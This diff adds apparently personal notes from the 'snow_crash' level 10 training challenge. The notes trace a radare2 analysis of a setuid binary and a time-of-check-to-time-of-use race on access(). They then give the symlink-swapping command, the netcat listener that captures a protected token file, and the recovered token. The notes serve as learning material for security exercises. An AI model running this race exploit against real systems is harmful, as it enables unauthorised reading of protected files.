@@ -1,0 +1,69 @@
+./level10 token 127.0.0.1
+You don't have access to token
+./level10 level10 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+you can listen to a port with nc:
+nc -l 6969
+
+this sends the file, we can see some strings. But we already could read that file of course
+
+a bit of disassembly with radare2 (on host computer):
+r2 level10
+aaa
+s sym.main
+VV
+
+aaa does the analysis
+s sym.main goes to main
+VV shows a call graph.
+
+it first checks if there's two arguments, then it checks for an access call
+snow_crash only uses known exploits of course :)
+
+man access:
+NOTES
+       Warning: Using access() to check if a user is authorized to, for example,  open
+       a  file before actually doing so using open(2) creates a security hole, because
+       the user might exploit the short time interval between checking and opening the
+       file  to manipulate it.  For this reason, the use of this system call should be
+       avoided.  (In the example just described, a safer alternative would be to  tem‐
+       porarily  switch  the  process's effective user ID to the real ID and then call
+       open(2).)
+
+ok, but I can't really move files around. I can't replace some file by token, because the whole problem is that I don't have read permissions.
+
+so we need a symlink
+
+rm /tmp/link; ln -s /home/user/level10/level10 /tmp/link; ./level10 /tmp/link 127.0.0.1; rm /tmp/link; ln -s /home/user/level10/token /tmp/link
+
+
+I thought it would help to put in a sleep, but even with a sleep of 0.0000000001 it doesn't seem to work
+
+maybe no sleep but trying often?
+
+scp -p to keep permissions
+
+nc -k flag to keep nc open
+
+it never seems to work in a single script
+
+use ln -f to remove existing, so I don't have to remove it
+o
+
+very hard to filter the output
+
+......I wasn't even linking to the token :( maybe it wasn't that hard
+
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
